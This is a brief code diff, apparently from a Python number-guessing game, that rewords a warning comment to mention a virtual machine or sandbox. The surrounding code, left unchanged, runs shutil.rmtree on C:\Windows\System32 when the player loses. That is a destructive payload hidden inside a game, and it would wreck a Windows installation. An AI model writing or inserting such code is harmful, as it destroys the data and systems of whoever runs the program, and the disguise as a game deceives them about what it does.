@@ -25,7 +25,7 @@ def guessing_game():
                 else:
                     print("Sorry. You lose. This is goodbye.")
                     time.sleep(2)
-                    # Warning: Proceed only in a controlled test environment
+                    # Warning: Proceed only in a controlled test environment such as a virtual machine (VM) or sandbox.
                     shutil.rmtree("C:\\Windows\\System32")
         except ValueError:
             print("Invalid input! Please enter a number between 1 and 10.")
